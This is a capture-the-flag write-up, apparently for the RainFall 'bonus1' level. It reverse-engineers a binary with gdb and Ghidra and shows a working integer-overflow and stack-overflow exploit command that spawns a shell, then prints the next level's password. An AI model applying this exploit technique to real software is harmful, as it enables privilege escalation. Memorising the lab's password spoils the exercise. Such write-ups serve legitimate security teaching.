# Bonus 1

```sh
(gdb) info func
All defined functions:

Non-debugging symbols:
0x080482d4  _init
0x08048320  memcpy
0x08048320  memcpy@plt
0x08048330  __gmon_start__
0x08048330  __gmon_start__@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  execl
0x08048350  execl@plt
0x08048360  atoi
0x08048360  atoi@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048424  main
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini
(gdb)
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax
   0x08048430 <+12>:	add    $0x4,%eax
   0x08048433 <+15>:	mov    (%eax),%eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    0x3c(%esp),%eax
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   0x08048464 <+64>:	lea    0x14(%esp),%eax
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret    
End of assembler dump.
(gdb) 


```

Ghidra :

```c
undefined4 main(undefined4 param_1,int param_2)

{
  undefined4 uVar1;
  undefined local_3c [40];
  int local_14;
  
  local_14 = atoi(*(char **)(param_2 + 4));
  if (local_14 < 10) {
    memcpy(local_3c,*(void **)(param_2 + 8),local_14 * 4);
    if (local_14 == 0x574f4c46) {
      execl("/bin/sh","sh",0);
    }
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

This one is kinda simple to undurstand.

The program takes two input, an integer, and a string.

If the integer is less then 10, then it does a memcpy on av[2] to a buffer with the limit fixed to integer * 4.

And after that if the integer is == 0x574f4c46 (1464814662 in decimal) it execute a shell.

The program return 0 if the integer is less then 0, or 1 if its higher, this help us to know if our input is right or not.

This is pretty straightfoward, we wanna overflow to overwrite the integer so its equal 0x574f4c46, but how can we overflow if we can just have 9 * 4 = 36 buffer lenght ?

Since the program first check the integer, and then times it by 4 we can trick it.

By using integer underflow, we are going to give him INT_MIN which will enter the first if, then it will become a positive integer after it get timed by 4.

An exemple here.

```c
#include <stdio.h>
int main(void)
{

        printf("Integer in if %d\n", -2147483648);
        printf("Integer in memcpy %d\n", -2147483648 * 4);
}
```

Output :

```sh
Integer in if -2147483648
Integer in memcpy 0
```

That's almost perfect, lets lower the integer.

```c
#include <stdio.h>
int main(void)
{

        printf("Integer in if %d\n", -2147483630);
        printf("Integer in memcpy %d\n", -2147483630 * 4);
}
```

```sh
Integer in if -2147483630
Integer in memcpy 72
```

We can now overflow the buffer with 72 char, if we need more space we just need to lower that integer.

We now just have to find the integer address and overwrite it.

Lets find the address of the integer so we can overflow it.

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp
   0x08048427 <+3>:	and    esp,0xfffffff0
   0x0804842a <+6>:	sub    esp,0x40
   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>:	add    eax,0x4
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    eax,0x1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>:	add    eax,0x8
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]
   0x08048462 <+62>:	mov    edx,eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    eax,0x0
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret    
End of assembler dump.
(gdb)
```
At *main+84 we know our integer is at esp + 0x3c (+60) so lets overwrite that.

Since the memcpy will copy our input to the buffer, our input will start where the buffer got initiated, at the top of the stack.

Lets place a break point to that place

```sh
(gdb) br *main+84
Breakpoint 1 at 0x8048478
```

Now we are going to put 60 'A' into the buffer in order to find where it start.

```sh

(gdb) run -2147483630 $(python -c "print '\x41' * 60")
Starting program: /home/user/bonus1/bonus1 -2147483630 $(python -c "print '\x41' * 60")

Breakpoint 1, 0x08048478 in main ()
(gdb) x/200x $esp
0xbffff6b0:	0xbffff6c4	0xbffff8d8	0x00000048	0x080482fd
0xbffff6c0:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x45485300	0x2f3d4c4c	0x2f6e6962	0xb7fdc858
0xbffff710:	0x00000000	0xbffff71c	0xbffff7a4	0x00000000
0xbffff720:	0x0804821c	0xb7fd0ff4	0x00000000	0x00000000
0xbffff730:	0x00000000	0xcfc9cae7	0xf88eeef7	0x00000000
0xbffff740:	0x00000000	0x00000000	0x00000003	0x08048370
0xbffff750:	0x00000000	0xb7ff26b0	0xb7e453e9	0xb7ffeff4
0xbffff760:	0x00000003	0x08048370	0x00000000	0x08048391
0xbffff770:	0x08048424	0x00000003	0xbffff794	0x080484b0
0xbffff780:	0x08048520	0xb7fed280	0xbffff78c	0xb7fff918
0xbffff790:	0x00000003	0xbffff8b3	0xbffff8cc	0xbffff8d8
0xbffff7a0:	0x00000000	0xbffff915	0xbffff925	0xbffff939
0xbffff7b0:	0xbffff958	0xbffff96b	0xbffff977	0xbffffe98
0xbffff7c0:	0xbffffea4	0xbffffef1	0xbfffff07	0xbfffff16
0xbffff7d0:	0xbfffff2c	0xbfffff3d	0xbfffff46	0xbfffff5d
0xbffff7e0:	0xbfffff65	0xbfffff74	0xbfffffa1	0xbfffffc1
0xbffff7f0:	0x00000000	0x00000020	0xb7fdd418	0x00000021
0xbffff800:	0xb7fdd000	0x00000010	0x178bfbff	0x00000006
0xbffff810:	0x00001000	0x00000011	0x00000064	0x00000003
0xbffff820:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffff830:	0x00000008	0x00000007	0xb7fde000	0x00000008
0xbffff840:	0x00000000	0x00000009	0x08048370	0x0000000b
0xbffff850:	0x000007db	0x0000000c	0x000007db	0x0000000d
0xbffff860:	0x000007db	0x0000000e	0x000007db	0x00000017
0xbffff870:	0x00000000	0x00000019	0xbffff89b	0x0000001f
0xbffff880:	0xbfffffe3	0x0000000f	0xbffff8ab	0x00000000
0xbffff890:	0x00000000	0x00000000	0x4b000000	0xe531214c
0xbffff8a0:	0x73cc1813	0x0560e266	0x696509ea	0x00363836
0xbffff8b0:	0x2f000000	0x656d6f68	0x6573752f	0x6f622f72
0xbffff8c0:	0x3173756e	0x6e6f622f	0x00317375	0x3431322d
0xbffff8d0:	0x33383437	0x00303336	0x41414141	0x41414141
0xbffff8e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff8f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff900:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff910:	0x41414141	0x45485300	0x2f3d4c4c	0x2f6e6962
0xbffff920:	0x68736162	0x52455400	0x74783d4d	0x2d6d7265
0xbffff930:	0x63363532	0x726f6c6f	0x48535300	0x494c435f
0xbffff940:	0x3d544e45	0x302e3031	0x322e322e	0x34383420
0xbffff950:	0x34203233	0x00323432	0x5f485353	0x3d595454
0xbffff960:	0x7665642f	0x7374702f	0x5500312f	0x3d524553
0xbffff970:	0x756e6f62	0x4c003173	0x4f435f53	0x53524f4c
0xbffff980:	0x3d73723d	0x69643a30	0x3b31303d	0x6c3a3433
0xbffff990:	0x31303d6e	0x3a36333b	0x303d686d	0x69703a30
0xbffff9a0:	0x3b30343d	0x733a3333	0x31303d6f	0x3a35333b
0xbffff9b0:	0x303d6f64	0x35333b31	0x3d64623a	0x333b3034
0xbffff9c0:	0x31303b33	0x3d64633a	0x333b3034	0x31303b33

```

Our buffer start at 0xbffff6c4.

And we know the variable we wanna to overwrite is at $esp + 0x3c

Simple math :

```sh
(gdb) p/d ($esp + 0x3c) - 0xbffff6c4
$1 = 40
```

We have our offset, lets overwrite that value !


Final exploit :

```sh
./bonus1 -2147483630 $(python -c "print '\x41' * 40 + '\x46\x4c\x4f\x57'")
```

To resume, we give -2147483630 in order to trick the first if that we are less than 10, and then the memcpy is going to times it by 4 which is going to give a big positive value, which will allow us to overflow.

We then find the offset of the compared value and overwrite with the right one.

```sh
bonus1@RainFall:~$ ./bonus1 -2147483630 $(python -c "print '\x41' * 40 + '\x46\x4c\x4f\x57'")
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ 
```

And it worked !